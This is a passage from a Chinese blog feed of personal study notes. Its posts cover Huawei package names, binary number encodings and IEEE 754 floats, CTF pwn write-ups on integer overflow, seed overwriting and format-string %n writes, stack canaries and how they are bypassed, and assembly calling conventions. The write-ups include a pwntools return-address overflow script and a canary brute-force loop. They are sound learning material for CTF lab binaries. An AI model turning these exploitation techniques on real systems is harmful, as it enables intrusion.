align="center">com.huawei.appmarket</td><td align="center">华为应用市场</td></tr><tr><td align="center">com.huawei.android.hwouc</td><td align="center">系统更新</td></tr><tr><td align="center">com.huawei.pengine</td><td align="center">智能建议</td></tr><tr><td align="center">com.huawei.videoeditor</td><td align="center">视频编辑</td></tr><tr><td align="center">com.huawei.contacts.sync</td><td align="center">联系人同步</td></tr><tr><td align="center">com.android.frameworkhwext.nova</td><td align="center">更换主题</td></tr><tr><td align="center">com.huawei.android.thememanager</td><td align="center">主题</td></tr><tr><td align="center">com.bjbyhd.screenreader_huawei</td><td align="center">屏幕阅读</td></tr><tr><td align="center">com.huawei.android.hwaps</td><td align="center">智能分辨率</td></tr><tr><td align="center">com.huawei.scenepack</td><td align="center">华为旅行助手</td></tr><tr><td align="center">com.android.printservice.recommendation</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.pcassistant</td><td align="center">电脑端工具</td></tr><tr><td align="center">com.android.keyguard</td><td align="center">华为杂志锁屏</td></tr><tr><td align="center">com.android.providers.downloads.ui</td><td align="center">下载内容</td></tr><tr><td align="center">com.huawei.hiai</td><td align="center">智慧引擎</td></tr><tr><td align="center">com.huawei.languagedownloader</td><td align="center">下载语言</td></tr><tr><td align="center">com.huawei.securitymgr</td><td align="center">隐私空间</td></tr><tr><td align="center">com.huawei.imedia.sws</td><td align="center">音效管理</td></tr><tr><td align="center">com.huawei.android.hsf</td><td align="center">华为框架服务</td></tr><tr><td align="center">com.baidu.input_huawei</td><td align="center">百度输入法华为版</td></tr><tr><td align="center">com.huawei.hwid</td><td align="center">华为移动服务</td></tr><tr><td align="center">com.android.cts.priv.ctsshim</td><td align="center">旅行助手</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器码总结</title>
      <link href="/2022/03/03/%E6%9C%BA%E5%99%A8%E7%A0%81%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/03/%E6%9C%BA%E5%99%A8%E7%A0%81%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="机器码总结"><a href="#机器码总结" class="headerlink" title="机器码总结"></a>机器码总结</h1><p>摘抄自：<a href="https://www.cnblogs.com/liushuijinger/archive/2012/04/05/2433718.html">https://www.cnblogs.com/liushuijinger/archive/2012/04/05/2433718.html</a></p><p><strong>原码：</strong></p><p>如果机器字长为n，那么一个数的原码就是用一个n位的二进制数，其中最高位为符号位：正数为0，负数为1。剩下的n-1位表示概数的绝对值。</p><p>例如： X=+101011 , [X]原= 00101011   X=-101011 , [X]原= 10101011 </p><p>位数不够的用0补全。</p><p>PS：正数的原、反、补码都一样。</p><p><strong>反码：</strong></p><p>知道了什么是原码，那反码就更是张飞吃豆芽——小菜一碟了。知道了原码，那么你只需要具备区分0跟1的能力就可以轻松求出反码，为什么呢？因为反码就是在原码的基础上，符号位不变其他位按位取反(就是0变1，1变0)就可以了。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100</p><p><strong>补码：</strong></p><p>补码也非常的简单就是在反码的基础上按照正常的加法运算加1。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100，[X]补=11010101</p><p><strong>移码：</strong></p><p>移码最简单了，不管正负数，只要将其补码的符号位取反即可。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100，[X]补=11010101，[X]移=01010101</p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浮点数的表示</title>
      <link href="/2022/03/03/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E8%A1%A8%E7%A4%BA/"/>
      <url>/2022/03/03/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="浮点数的表示"><a href="#浮点数的表示" class="headerlink" title="浮点数的表示"></a>浮点数的表示</h1><p>c语言中的浮点数：float , double , long double</p><p><strong>首先，为什么要使用浮点方法，为什么要使用浮点数而不使用定长小数。</strong></p><p>这是因为如果小数定长，其精度就是固定的，也就是说，这样的表示方法就会有固定长度的整数位和小数位。一般这些位数都不会被全部用到，甚至很有可能牺牲精度，或者造成空间浪费，因此，需要创造一种小数点可以移动的数字表示方法，即浮点数。</p><p><strong>其次，如何科学的表示二进制数。</strong></p><p>这里引入二进制的科学计数法：<br>十进制有科学计数法，任何十进制数都可以表示为<code>x.xxxx*10^n</code>(x为0-9)，同理，所有二进制数也可以表示为<code>1.xxx*2^n</code>(x为0-1)，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101101.11101101转化为科学计数法</span><br><span class="line">1.0110111101101*2^5</span><br></pre></td></tr></table></figure><p>那么按照这样的思路，一个二进制数，就能表示为一个整数位定长为1，且一定是1的数字<code>1.0110111101101</code>(因为整数位永远是1，因此其实可以默认)，和另一个整数<code>5</code>，代表乘2的多少次方。</p><p><strong>然后，再加入正负的可能性，我们就可以完全的表示一个二进制数。</strong>**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N=((-1)^S)*(R^E)*M</span><br><span class="line">其中N是这个二进制数；</span><br><span class="line">S有两种取值，0表示N为正数，1表示N为负数；</span><br><span class="line">R恒为2；</span><br><span class="line">E是科学计数法中2的指数；</span><br><span class="line">M为科学计数法中以1.开头的二进制表示</span><br></pre></td></tr></table></figure><p><strong>最后，我们就可以开始设计浮点数了</strong></p><p>S有两种取值，只需要一位；</p><p>R取值固定，不需要表示，默认即可；</p><p>E是指数（上例中的5），为一个不定长的整数（可能正，可能负），需要多位；</p><p>M一定以1开头，因此可以忽略1，直接记录小数点后面的小数（即只记录0110111101101）；</p><p>我们看看官方的表示方法：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220303091320390.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220303091346438.png" alt="image-20220303091346438"></p><blockquote><p>IEEE<strong>754</strong>标准(规定了浮点数的表示格式,运算规则等)</p><p>​    规则规定了单精度(32)和双精度(64)的基本格式.<br>​    规则中,尾数（M）用原码,指数（E）用移码(便于对阶和比较)</p></blockquote><p>源码顾名思义就是二进制数直接写出来，不含符号位。</p><p>移码是什么呢？</p><p>上面说过，指数是有正负的可能性的，移码其实就是取中间数为0，减少为负数，增加为正数。</p><p>比如说：</p><p>对于32位的浮点数来说，E的位数有八位（256），因此选择127（01111111）为0，那么相应的，1就是128（10000000），-1就是126（01111110）。因此，如果给出一个值E，E-127就是指数的真实值。</p><p>同理，对于64位的浮点数来说，E的位数有11位，那么把E换算成十进制后，E-1023就是指数的真实值。</p><p>这样我们就学会如何表示一个浮点数了。</p><p>我们给出一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">20.59375转化为32位数浮点表示</span><br><span class="line">首先分别将整数和分数部分转换成二进制数：</span><br><span class="line">20.59375=10100.10011</span><br><span class="line">     然后移动小数点，使其在第1，2位之间</span><br><span class="line">10100.10011=1.010010011×2^4</span><br><span class="line">     e=4于是得到：</span><br><span class="line">S=0, E=4+127=131, M=010010011</span><br><span class="line">    因此最后得到32位浮点数的二进制存储格式为：</span><br><span class="line">01000001101001001100000000000000=(41A4C000)16</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_intOverflow_pwn</title>
      <link href="/2022/02/28/writeup_intOverflow_pwn/"/>
      <url>/2022/02/28/writeup_intOverflow_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-intOverflow-pwn"><a href="#writeup-intOverflow-pwn" class="headerlink" title="writeup_intOverflow_pwn"></a>writeup_intOverflow_pwn</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227161432735.png" alt="image-20220227161432735"></p><p>先小查一下，开启了堆栈不可执行，放ida吧</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085215182.png" alt="image-20220228085215182"></p><p>逻辑很清楚，进login</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085545413.png" alt="image-20220228085545413"></p><p>username：0x19<br>pw：0x199</p><p>好长的密码</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085532326.png" alt="image-20220228085532326"></p><p>密码的长度为3-8则输出错误，否则正确。</p><p>那么首先要找溢出点，在<code>login</code>函数中，空间给的很大，而且<code>read()</code>函数限制严格，不可能溢出。</p><p>然后来到<code>check</code>函数中，一开始对密码的长度做了校验，然后把校验长度之后的密码通过strcpy放入dest中，这里dest的大小很小：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228111258226.png" alt="image-20220228111258226"></p><p>如果能跳过校验，我们就可以覆盖掉返回地址，然后调用<code>what_is_this</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228111405540.png" alt="image-20220228111405540"></p><p>那么如何绕过校验，让strcpy执行，复制足够长的字符串呢？这就需要整数溢出</p><blockquote><p>   Int8, 等于Byte, 占1个字节.</p></blockquote><p>可以看到int8非常的小，最大就是255， 如果存入int8的值比255还大，就会循环溢出。</p><p>因此</p><blockquote><p>password字符串的长度可以是3-8个字符，也可以是259-264个字符</p></blockquote><p>就靠这个原理就可以构造shellcode了，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote()</span><br><span class="line"></span><br><span class="line">cat_flag_addr=<span class="number">0x0804868B</span></span><br><span class="line"><span class="comment">#危险函数的地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>, <span class="string">&quot;kk&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your passwd:&quot;</span>)</span><br><span class="line"><span class="comment">#如果密码长度为259（溢出后为4）</span></span><br><span class="line"><span class="comment">#0x18字节到溢出位</span></span><br><span class="line"><span class="comment">#溢出地址占四字节</span></span><br><span class="line"><span class="comment">#259-0x18-4=231</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>+ p32(cat_flag_addr)+<span class="string">b&quot;a&quot;</span>*<span class="number">231</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>跑一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228114041108.png" alt="image-20220228114041108"></p><p>受不了python3了，马上就换2</p><p><strong>cyberpeace{988edb16506abc237bbd8c3996cf7728}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_guessNum_pwn</title>
      <link href="/2022/02/27/writeup_guessNum_pwn/"/>
      <url>/2022/02/27/writeup_guessNum_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-guessNum-pwn"><a href="#writeup-guessNum-pwn" class="headerlink" title="writeup_guessNum_pwn"></a>writeup_guessNum_pwn</h1><p>咱就是说，还得会c语言我是没想到的，枯了</p><p>先check一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125713760.png" alt="image-20220227125713760"></p><p>好家伙，一片绿，哈人，没法覆盖返回地址了。</p><p>先扔ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125511131.png" alt="image-20220227125511131"></p><p>循环产生随机数，然后猜数字，v7似乎可以做一个溢出</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125816761.png" alt="image-20220227125816761"></p><p>然后就需要一点点c语言知识，在上面的区域中，seed变量的值是可以覆盖的，而seed是什么呢？</p><p><em>在使用rand()函数时，首先需要使用srand设定一个seed，只有随机生成了seed每一次rand()顺序生成的数列才是不同的，若seed相同时，生成的随机数列也是相同的。</em></p><p>我不信，小试一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227154839418.png" alt="image-20220227154839418"></p><p>我信了。。。</p><p>按照逆向的思路，我们可以看看随机的seed是如何生成的，进入sub_BB0函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227155010434.png" alt="image-20220227155010434"></p><p>果然不是逆向，是在本地文件中读取的，那没事了。</p><p>所以只要覆盖seed，并且用seed在本地生成随机数，然后再传过去就可以了，创作一个脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227155955030.png" alt="image-20220227155955030"></p><p>顺便学一下python中调用c语言。</p><p><strong>cyberpeace{5df2a9bab4fa085d9359d4c9722f857c}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Canery(金丝雀)的介绍与绕过</title>
      <link href="/2022/02/27/Canery(%E9%87%91%E4%B8%9D%E9%9B%80)%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
      <url>/2022/02/27/Canery(%E9%87%91%E4%B8%9D%E9%9B%80)%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Canery-金丝雀-的介绍与绕过"><a href="#Canery-金丝雀-的介绍与绕过" class="headerlink" title="Canery(金丝雀)的介绍与绕过"></a>Canery(金丝雀)的介绍与绕过</h1><p>摘抄文献 ：<a href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p><blockquote><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p></blockquote><p>当我们使用栈溢出进行攻击，或者覆盖返回地址时，会覆盖掉源数据。金丝雀机制就是在栈底插入cookie验证信息，如果cookie被覆盖就会验证失败。</p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段。</p><h2 id="Canary的使用（gcc）"><a href="#Canary的使用（gcc）" class="headerlink" title="Canary的使用（gcc）"></a>Canary的使用（gcc）</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><p><code>-fstack-protector </code>启用保护，不过只为局部变量中含有数组的函数插入保护<br><code>-fstack-protector-all </code>启用保护，为所有函数插入保护<br><code>-fstack-protector-strong</code><br><code>-fstack-protector-explicit </code>只对有明确 stack_protect attribute 的函数开启保护<br><code>-fno-stack-protector</code> 禁用保护</p><h2 id="canary的实现原理："><a href="#canary的实现原理：" class="headerlink" title="canary的实现原理："></a>canary的实现原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><h2 id="Canary的绕过"><a href="#Canary的绕过" class="headerlink" title="Canary的绕过"></a>Canary的绕过</h2><p>给出常见的存在 Canary 的栈溢出利用思路，每种方法都有特定的环境要求。</p><h3 id="一、泄露栈中的Canary"><a href="#一、泄露栈中的Canary" class="headerlink" title="一、泄露栈中的Canary"></a>一、泄露栈中的Canary</h3><p>通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中.</p><h3 id="二、爆破Canary"><a href="#二、爆破Canary" class="headerlink" title="二、爆破Canary"></a>二、爆破Canary</h3><p>虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的。</p><p>附爆破python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Brute forcing stack canary &quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != <span class="string">&quot;&quot;</span>:</span><br><span class="line">         p = p + <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Exploit failed&quot;</span></span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure><h3 id="三、劫持-stack-chk-fail-函数"><a href="#三、劫持-stack-chk-fail-函数" class="headerlink" title="三、劫持__stack_chk_fail 函数"></a>三、劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用</p><h3 id="四、覆盖-TLS-中储存的-Canary-值"><a href="#四、覆盖-TLS-中储存的-Canary-值" class="headerlink" title="四、覆盖 TLS 中储存的 Canary 值"></a>四、覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup-CGfsb-pwn</title>
      <link href="/2022/02/26/writeup_CGfsb_pwn/"/>
      <url>/2022/02/26/writeup_CGfsb_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-CGfsb-pwn"><a href="#writeup-CGfsb-pwn" class="headerlink" title="writeup-CGfsb-pwn"></a>writeup-CGfsb-pwn</h1><p>麻了，pwn好难哈哈哈哈哈哈</p><p>本题目是利用字符串格式化漏洞来更改<code>pwnme</code>变量的值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170521013.png" alt="image-20220226170521013"></p><p>先看看pwnme变量存在哪了？</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170644707.png" alt="image-20220226170644707"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170741811.png" alt="image-20220226170741811"></p><p>简单地说，就是一个会自动初始化为0的可读写区段。</p><p>那么，到底什么是字符串格式化漏洞？</p><p><code>printf</code>函数含有的参数构造是由一个固定的<strong>format</strong>字符串和<strong>多个输出表列</strong>组成的，他们在函数调用时被一起推入内存，当我们在format字符串中形如填了<code>%啥</code>的东西后，他就会自动在内存中寻找参数（也就是我们推入的输出表项）；</p><p>在printf函数中，有一个带有赋值功能的格式化字符串是<code>%n</code>，其功能就是记录在<code>%n</code>之前输出的字符数，然后将此值赋给一个变量。那赋值给哪一个变量呢？我们就需要传入这个变量的指针，也就是使用<code>&amp;变量名</code>来接收参数，即类似于下图中的语法：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226173819436.png" alt="image-20220226173819436"></p><p>这样一来，我们就可以利用printf进行赋值了。</p><p>那么，我们要赋值给pwnme这个变量，要怎么做呢。</p><p>我们只能传入一个参数，因此需要手动设定在format字符串中%n这个赋值操作的偏移量，他并不是直接指向下一个地址，而是指向了某一个存了目标（即pwnme）变量的指针的地址，那么这个指针肯定也是由我们通过前面的输入（就是format字符串中有一个地址，我们用控制%n的偏移，让他赋值的时候赋给format中含有的那个地址）传入的内容啦。</p><p>那么，控制偏移要怎么做？</p><blockquote><p>%n：将%n 之前 printf 已经打印的字符个数赋值给<strong>偏移处指针所指向的地址 位置，如%100×10$n 表示将 0x64 写入偏移 10 处保存的指针所指向的地址（4 字节）</strong>，而%$hn 表示写入的地址空间为 2 字节，%$hhn 表示写入的地址空间为 1 字节，%$lln 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时， 直接写 4 字节会导致程序崩溃或等候时间过长，可以通过%$hn 或%$hhn 来适时 调整。</p></blockquote><p>就是这样，我们模仿这样的语法去调用就可以。。。</p><p>然后呢，我们现在需要知道的就是，我们通过scanf输入的那个地址存在哪里，我们用printf去往那个地址上赋值就可以了。</p><p>那么，我们需要知道printf函数的调用地址相较scanf输入的偏移量，可以有两种方法：</p><p><strong>其一，用格式化字符串进行输出测试</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226220040384.png" alt="image-20220226220040384"></p><p>可以看到，在红圈处圈起来的就是<em>aaaa</em>的十六进制码，除了<em>aaaa</em>以外，在第十的位置。</p><p><strong>其二，用gdb进行调试</strong></p><p>真难用，换edb吧还是。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226222728483.png" alt="image-20220226222728483"></p><p>差十个地址。</p><p>然后我们知道了偏移值后，就可以构造脚本了</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226223030843.png" alt="image-20220226223030843"></p><p>不能说不费劲，只能说是非常费劲。。。</p><p><strong>cyberpeace{79366eb910334f932677401355a7f418}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编函数调用的传参规则</title>
      <link href="/2022/02/26/%E6%B1%87%E7%BC%96_%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99/"/>
      <url>/2022/02/26/%E6%B1%87%E7%BC%96_%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编函数调用的传参规则"><a href="#汇编函数调用的传参规则" class="headerlink" title="汇编函数调用的传参规则"></a>汇编函数调用的传参规则</h1><h2 id="0x01-一般流程"><a href="#0x01-一般流程" class="headerlink" title="0x01 一般流程"></a>0x01 一般流程</h2><p>函数调用一般有个模板。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">push es</span><br><span class="line">mov ebp,esp</span><br><span class="line">//这里提升堆栈</span><br><span class="line">sub esp,0x40  </span><br><span class="line">//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。</span><br><span class="line">push edi</span><br><span class="line">push esi</span><br><span class="line">push ebx</span><br><span class="line">//保留现场</span><br><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx,0x10</span><br><span class="line">mov eax,0xcccccccc</span><br><span class="line">rep stos dowrd ptr es:[edi]</span><br><span class="line">//填充缓冲区</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">//这里是写函数的功能</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">pop ebx</span><br><span class="line">pop esi</span><br><span class="line">pop edi</span><br><span class="line">//恢复现场</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>中间的ccc…就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p><p>根据函数调用约定的不同，堆栈平衡的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者里add esp，xx来平衡堆栈。</p><h2 id="0x02-调用约定"><a href="#0x02-调用约定" class="headerlink" title="0x02 调用约定"></a>0x02 调用约定</h2><p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：</p><h3 id="cedcl-约定："><a href="#cedcl-约定：" class="headerlink" title="__cedcl 约定："></a>__cedcl 约定：</h3><p>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br>push xxx<br>push xxx<br>…<br>然后call 函数。<br>//函数执行完毕<br>add esp ，xx<br>//在母函数中平衡堆栈</p><h3 id="stdcall-约定："><a href="#stdcall-约定：" class="headerlink" title="stdcall 约定："></a>stdcall 约定：</h3><p>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 ret 后加个 xx 恢复堆栈<br>例如 ret 0x8，相当于 pop eip add esp，0x8</p><h3 id="fastcall-约定："><a href="#fastcall-约定：" class="headerlink" title="fastcall 约定："></a>fastcall 约定：</h3><p>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如 (int a,int b,int c)<br>push c<br>mov eax,b<br>mov ecx,a<br>然后再call 函数，最后在子函数中平衡堆栈。</p><p>————————————————<br>版权声明：本文为CSDN博主「dittozzz」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_43394612/article/details/84332149">https://blog.csdn.net/qq_43394612/article/details/84332149</a></p><h2 id="0x03-64位传参"><a href="#0x03-64位传参" class="headerlink" title="0x03 64位传参"></a>0x03 64位传参</h2><h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><p>摘自：<a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>参数个数大于 7 个的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 